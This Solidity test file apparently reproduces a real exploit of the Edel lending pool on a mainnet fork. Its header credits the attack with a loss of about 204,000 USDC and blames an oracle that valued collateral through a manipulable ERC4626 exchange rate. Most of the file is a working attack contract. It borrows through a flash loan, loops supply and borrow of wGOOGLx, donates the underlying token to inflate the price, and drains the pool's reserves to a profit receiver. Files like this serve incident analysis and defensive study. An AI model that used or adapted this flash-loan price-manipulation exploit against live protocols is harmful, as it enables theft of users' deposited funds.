// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 204,215.57 USDC
// Attacker : 0x58428161bB55c14A413945f06cbDeC157F411C76
// Attack Contract : 0x1F05c70Db2fFa1B1BAc62b27e7678B765ebe7167
// Vulnerable Contract : 0xBd497eE429D9D3E46446339286271b3714a83B29
// Entry/State Contract : 0x3EEeB3cd20f844a578807fc457388Ceb9A67fAa6
// Attack Tx : https://etherscan.io/tx/0xe2320086b2815d21b0927839bd0e306466c29a68d38d5361e99dd21ec5472612
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xBd497eE429D9D3E46446339286271b3714a83B29#code
// Entry Proxy Code : https://etherscan.io/address/0x3EEeB3cd20f844a578807fc457388Ceb9A67fAa6#code
//
// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2072130807356129726
//
// Attack summary: the attacker recursively supplied borrowed wGOOGLx to an Edel collateral helper, redeemed a
// final wGOOGLx borrow, donated the underlying GOOGLx back to the wrapper, and used the inflated wrapper price to
// borrow the remaining USDC and wrapped xStock reserves.
// Root cause: the lending market's oracle valued wrapped xStock collateral through a mutable ERC4626
// convertToAssets() exchange rate, so a direct underlying donation inflated collateral value inside the same tx.

address constant ATTACKER = 0x58428161bB55c14A413945f06cbDeC157F411C76;
address constant EDEL_POOL = 0x3EEeB3cd20f844a578807fc457388Ceb9A67fAa6;
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WGOOGLX_TOKEN = 0x1630F08370917E79df0B7572395a5e907508bBBc;
address constant GOOGLX_TOKEN = 0xe92f673Ca36C5E2Efd2DE7628f815f84807e803F;
address constant WSPYX_TOKEN = 0xc88FcD8B874fDb3256E8B55b3decB8c24EAb4c02;
address constant WQQQX_TOKEN = 0xdbD9232fee15351068Fe02F0683146e16D9f2cEa;
address constant WMSTRX_TOKEN = 0x266E5923F6118F8b340cA5a23AE7f71897361476;
address constant WNVDAX_TOKEN = 0x93E62845C1DD5822EbC807ab71A5Fb750DecD15A;
address constant WTSLAX_TOKEN = 0x43680aBF18cf54898Be84C6eF78237CFBD441883;

address constant EUSDC = 0xa66C648965781a67cae928fECdD413b32E081E38;
address constant EWGOOGLX = 0x0eC96784aA6f47E456E0Ce4eB2a8B00F1A6C9b74;
address constant EWSPYX = 0x3B707b904841579d81e0e5bd71e65DaA269E7B5F;
address constant EWQQQX = 0x44cA9E30b96fF05D5E4AA44A295F15954E47cA1b;
address constant EWMSTRX = 0x854633708BCC6dFA0650CBf557B6ceB383564ec0;
address constant EWNVDAX = 0x706D86fb27017df76c4777Ad987142838141eFf3;
address constant EWTSLAX = 0xE97b0920b5d4e358E4564FBB4d40aACAd9cf3392;

uint256 constant FORK_BLOCK = 25_434_061;
uint256 constant USDC_FLASH_AMOUNT = 180_000_000_000;
uint256 constant WGOOGLX_LOOP_COUNT = 40;

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        multiAssetLog = true;
        attacker = ATTACKER;
        _addFundingToken(USDC_TOKEN);
        _addFundingToken(WSPYX_TOKEN);
        _addFundingToken(WQQQX_TOKEN);
        _addFundingToken(WMSTRX_TOKEN);
        _addFundingToken(WNVDAX_TOKEN);
        _addFundingToken(WTSLAX_TOKEN);

        vm.label(ATTACKER, "Attacker");
        vm.label(EDEL_POOL, "Edel Pool Proxy");
        vm.label(MORPHO, "Morpho Blue");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(WGOOGLX_TOKEN, "wGOOGLx");
        vm.label(GOOGLX_TOKEN, "GOOGLx");
        vm.label(WSPYX_TOKEN, "wSPYx");
        vm.label(WQQQX_TOKEN, "wQQQx");
        vm.label(WMSTRX_TOKEN, "wMSTRx");
        vm.label(WNVDAX_TOKEN, "wNVDAx");
        vm.label(WTSLAX_TOKEN, "wTSLAx");
    }

    function testExploit() public balanceLog {
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(ATTACKER);
        uint256 spyBefore = IERC20(WSPYX_TOKEN).balanceOf(ATTACKER);
        uint256 qqqBefore = IERC20(WQQQX_TOKEN).balanceOf(ATTACKER);
        uint256 mstrBefore = IERC20(WMSTRX_TOKEN).balanceOf(ATTACKER);
        uint256 nvdaBefore = IERC20(WNVDAX_TOKEN).balanceOf(ATTACKER);
        uint256 tslaBefore = IERC20(WTSLAX_TOKEN).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        EdelXStockAttack attack = new EdelXStockAttack(ATTACKER);
        attack.execute();

        assertGt(IERC20(USDC_TOKEN).balanceOf(ATTACKER) - usdcBefore, 204_000_000_000, "USDC profit not reproduced");
        assertGt(IERC20(WSPYX_TOKEN).balanceOf(ATTACKER) - spyBefore, 122 ether, "wSPYx profit not reproduced");
        assertGt(IERC20(WQQQX_TOKEN).balanceOf(ATTACKER) - qqqBefore, 62 ether, "wQQQx profit not reproduced");
        assertGt(IERC20(WMSTRX_TOKEN).balanceOf(ATTACKER) - mstrBefore, 293 ether, "wMSTRx profit not reproduced");
        assertGt(IERC20(WNVDAX_TOKEN).balanceOf(ATTACKER) - nvdaBefore, 99 ether, "wNVDAx profit not reproduced");
        assertGt(IERC20(WTSLAX_TOKEN).balanceOf(ATTACKER) - tslaBefore, 37 ether, "wTSLAx profit not reproduced");
    }
}

contract EdelXStockAttack {
    address private immutable profitReceiver;
    EdelCollateralHelper private immutable helper;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
        helper = new EdelCollateralHelper();

        IERC20(USDC_TOKEN).approve(EDEL_POOL, type(uint256).max);
        IERC20(USDC_TOKEN).approve(MORPHO, type(uint256).max);
        IERC20(WGOOGLX_TOKEN).approve(EDEL_POOL, type(uint256).max);
    }

    function execute() external {
        IMorphoBuleFlashLoan(MORPHO).flashLoan(USDC_TOKEN, USDC_FLASH_AMOUNT, "");
        IERC20(USDC_TOKEN).transfer(profitReceiver, IERC20(USDC_TOKEN).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == MORPHO, "unexpected morpho callback sender");
        require(assets == USDC_FLASH_AMOUNT, "unexpected flash amount");

        // step 1: seed the coordinator account with USDC collateral from Morpho.
        IAaveFlashloan(EDEL_POOL).supply(USDC_TOKEN, assets, address(this), 0);

        // step 2: recursively borrow the wGOOGLx reserve and resupply it through the helper.
        for (uint256 i = 0; i < WGOOGLX_LOOP_COUNT; i++) {
            uint256 reserveBalance = IERC20(WGOOGLX_TOKEN).balanceOf(EWGOOGLX);
            IAaveFlashloan(EDEL_POOL).borrow(WGOOGLX_TOKEN, reserveBalance, 2, 0, address(this));
            IERC20(WGOOGLX_TOKEN).transfer(address(helper), reserveBalance);
            helper.supplyWGooglx(reserveBalance);
        }

        // step 3: redeem one final wGOOGLx borrow, then donate GOOGLx to inflate convertToAssets().
        uint256 finalReserveBalance = IERC20(WGOOGLX_TOKEN).balanceOf(EWGOOGLX);
        IAaveFlashloan(EDEL_POOL).borrow(WGOOGLX_TOKEN, finalReserveBalance, 2, 0, address(this));
        IERC4626(WGOOGLX_TOKEN).redeem(finalReserveBalance, address(this), address(this));
        IERC20(GOOGLX_TOKEN).transfer(WGOOGLX_TOKEN, IERC20(GOOGLX_TOKEN).balanceOf(address(this)));

        // step 4: drain borrowable reserves against the helper's inflated wGOOGLx collateral.
        helper.borrowAndForward(USDC_TOKEN, EUSDC, address(this));
        helper.borrowAndForward(WSPYX_TOKEN, EWSPYX, profitReceiver);
        helper.borrowAndForward(WQQQX_TOKEN, EWQQQX, profitReceiver);
        helper.borrowAndForward(WMSTRX_TOKEN, EWMSTRX, profitReceiver);
        helper.borrowAndForward(WNVDAX_TOKEN, EWNVDAX, profitReceiver);
        helper.borrowAndForward(WTSLAX_TOKEN, EWTSLAX, profitReceiver);

        // step 5: allow Morpho to pull its principal repayment after this callback returns.
        IERC20(USDC_TOKEN).approve(MORPHO, assets);
    }
}

contract EdelCollateralHelper {
    constructor() {
        IERC20(WGOOGLX_TOKEN).approve(EDEL_POOL, type(uint256).max);
    }

    function supplyWGooglx(
        uint256 amount
    ) external {
        IAaveFlashloan(EDEL_POOL).supply(WGOOGLX_TOKEN, amount, address(this), 0);
    }

    function borrowAndForward(
        address asset,
        address reserveHolder,
        address receiver
    ) external {
        uint256 amount = IERC20(asset).balanceOf(reserveHolder);
        IAaveFlashloan(EDEL_POOL).borrow(asset, amount, 2, 0, address(this));
        IERC20(asset).transfer(receiver, IERC20(asset).balanceOf(address(this)));
    }
}
